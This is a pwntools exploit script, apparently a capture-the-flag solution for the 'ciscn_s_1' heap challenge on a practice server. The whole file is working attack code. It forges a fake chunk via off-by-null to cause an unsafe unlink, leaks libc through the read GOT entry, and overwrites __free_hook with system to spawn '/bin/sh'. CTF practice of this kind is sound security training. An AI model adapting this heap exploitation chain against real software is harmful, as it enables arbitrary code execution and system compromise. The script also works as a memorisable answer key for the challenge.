from pwn import *


ld_path = "/home/fanxinli/libc-so/libc-27/ld-2.27.so"
libc_path = "/home/fanxinli/libc-so/libc-2.27-64.so"
# p = process([ld_path, "./ciscn_s_1"], env={"LD_PRELOAD":libc_path})
# p = process([ld_path, ""])
# p = process("", env={"LD_PRELOAD":libc_path})
# p = process("")
p = remote("node4.buuoj.cn", 27051)

# context.log_level = "debug"

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()


def add(index, size, con):
    sa("4.show\n", "1")
    sa("index:\n", str(index))
    sa("size:\n", str(size))
    rud("gift: ")
    info = int(rud("\n"), 16)
    print("addr: ", hex(info))
    sa("content:\n", con)

def free(index):
    sa("4.show\n", "2")
    sa("index:\n", str(index))

def edit(index, con):
    sa("4.show\n", "3")
    sa("index:\n", str(index))
    sa("content:\n", con)

def show(index):
    sa("4.show\n", "4")
    sa("index:\n", str(index))


# off by null

# unlink
for i in range(2, 7+2):
    add(i, 0xf0, "a")
add(32, 0xf8, "a")
add(31, 0xf0, "a")
for i in range(2, 7+2):
    free(i)

heap = 0x06020E0+0x8*32
fd = heap-0x18
bk = heap-0x10
pad = p64(0)+p64(0xf1)+p64(fd)+p64(bk)
pad = pad.ljust(0xf0, b"\x00")
pad += p64(0xf0)
edit(32, pad)

free(31)

# leak libc
pro = ELF("./ciscn_s_1")
read_g = pro.got["read"]

pad = p64(0)+p64(read_g)+p64(0)+p64(heap)
pad = pad.ljust(0xf0, b"\x00")+p32(0x3)+p32(0x3)
edit(32, pad)

show(30)
info = u64(rud("\n").ljust(8, b"\x00"))
print("leak: ", hex(info))

# count
libc = ELF(libc_path)
base = info-libc.sym["read"]
print("base: ", hex(base))
f_hook = base+libc.sym["__free_hook"]
system = base+libc.sym["system"]

# alter free_hook to system
edit(32, p64(f_hook-0x8))
edit(32, b"/bin/sh\x00"+p64(system))

# attack
free(32)

shell()


